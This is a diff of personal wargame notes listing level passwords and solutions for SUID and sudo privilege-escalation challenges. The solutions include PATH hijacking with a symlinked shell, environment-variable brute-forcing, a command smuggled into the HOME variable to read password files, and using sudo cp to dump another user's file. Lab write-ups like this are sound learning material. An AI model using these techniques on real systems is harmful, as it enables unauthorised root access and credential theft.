@@ -67,7 +67,7 @@ sol; 1. ./read, run the file
 
 -lvl althea
 pass: ObxEmwisYjERrDfvSbdA
-chall type: SUID binary abuse
+chall type: SUID binary abuse for cmd injection
 chall break down:
     1. same binary perms as above 
     2. same but different user
@@ -85,4 +85,52 @@ sol; 1. ./lsme
 
 -lvl andromeda
 pass: OTWGTbHzrxhYFSTlKcOt
-chall type: 
+chall type: SUID binary abuse for path injection
+chall breakdown; 
+        SAME
+        > Path hijacking happens when a program calls a command without an absolute path
+sol; 
+     1. uid runs the id cmd, i assumed it ran through a relative path becuse each user has their own programs and executables
+     
+     2. ln -s /bin/bash /tmp/id
+       >creates a symlink thats points to the shell
+       > uid binary looks for id, relatively, echo $PATH should show the path it takes to look for it, our goal is to spawm an elevated shell throuh the binary
+     3. PATH=/tmp:$PATH
+       > set the path to begin with tmp where we created our fake id(symlink) that spawns a shell
+       > the ln -s /bin/sh /tmp/id makes /tmp/id -> /bin/bash
+
+-lvl anthea
+pass: yWFLtSNQArEBTHtWgkKd
+chall type: SUID abuse for env var abuse
+sol; 
+    1. ./obsessed
+   > the binary inherits ENV varible to run 
+    2. export MYID=94
+   > WRONG ENV
+    3. for id in {1..100}; do env -i MYID=$id ./obsessed; done
+   > tried bruteforcing 
+    4. env -i MYID=^ ./obsessed 
+   > last hope, i tried the ascii 94 which is the caret (^) symbol
+
+-lvl aphrodite
+pass: HPJVaqRzieKQeyyATsFv
+chall type: SUID binary abuse for env+cmd injection 
+assumption: binary does -> ls $HOME
+sol; 
+    1. env -i HOME=";cat /pwned/aphrodite;cat ariadne_pass.txt: ./homecontent
+
+-lvl ariadne
+pass: iNgNazuJrmhJKWixktzk
+chall type: sudo privilege abuse
+sol;
+    1.  find / -name "arete_pass.txt" 2>/dev/null
+    2.  sudo -u arete /bin/cp /run/lock/arete_pass.txt /dev/stdout
+   > /dev/stdout, is the output so the file is automatically read
+
+-lvl arete
+pass: QjrIovHacmGWxVjXRLmA
+chall typesta
+
+
+
+
